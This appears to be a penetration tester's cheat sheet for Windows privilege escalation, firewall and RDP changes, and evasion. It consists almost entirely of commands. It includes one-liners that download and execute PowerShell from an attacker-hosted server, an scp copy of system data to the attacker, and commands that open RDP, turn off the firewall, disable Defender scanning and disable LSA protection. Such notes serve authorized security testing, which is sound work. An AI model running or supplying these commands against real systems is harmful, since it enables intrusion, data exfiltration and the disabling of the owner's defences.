# Privilege Escalation Tools

## Overview

Transfer tools to the target or host them on an HTTP server at <attacker IP>.

## Commands

C# / binaries — /opt/SharpCollection/
    SharpUp.exe audit
    Seatbelt.exe -group=user -outputfile="C:\Users\Public\sb-user.txt"
    Seatbelt.exe -group=system -outputfile="C:\Users\Public\sb-system.txt"
    Seatbelt.exe -group=remote -outputfile="C:\Users\Public\sb-remote.txt"
    Watson.exe

PEASS-ng — /opt/PEASS-ng/
    winPEASx64.exe cmd
    winPEASx64.exe quiet cmd
    # PowerShell: /opt/PEASS-ng/winPEAS/winPEASps1/winPEAS.ps1

PowerShell — host from attacker:
    cd /opt/PowerSploit/Privesc/
    python3 -m http.server 80
    powershell -nop -exec bypass
    iex (iwr -UseBasicParsing http://<attacker IP>/PowerUp.ps1); Invoke-AllChecks

    cd /opt/PrivescCheck/
    python3 -m http.server 80
    powershell -nop -exec bypass
    iex (iwr -UseBasicParsing http://<attacker IP>/PrivescCheck.ps1); Invoke-PrivescCheck

Python — missing patches:
    cd /opt/Windows-Exploit-Suggester-NG
    ./wes.py --update
    systeminfo > systeminfo.txt
    scp systeminfo.txt kali@<attacker IP>:/opt/Windows-Exploit-Suggester-NG/
    ./wes.py systeminfo.txt

## Validation / False Positives

winPEAS and SharpUp report potential issues — confirm exploitable paths manually before reporting.
An unquoted service path still requires write access to the service binary location.


# Firewall and RDP

## Commands

Allow RDP and start Terminal Services:
    netsh advfirewall firewall add rule name="Remote Desktop" dir=in action=allow protocol=TCP localport=3389
    net start TermService

Disable firewall (noisy):
    netsh advfirewall firewall set allprofiles state off


# Evasion

## Overview

Check endpoint controls before loading PowerShell tooling. Run AMSI bypass only when needed and only on authorized assessments.

## Commands

Defender exclusions:
    reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions" /s

Installed AV:
    Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct

Defender preferences (requires admin, noisy):
    Set-MpPreference -DisableScriptScanning $True
    Set-MpPreference -DisableRealtimeMonitoring $True
    Add-MpPreference -ExclusionPath "C:\Windows\Temp"

LSA protection (reboot often required):
    reg add HKLM\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL /t REG_DWORD /d 0 /f
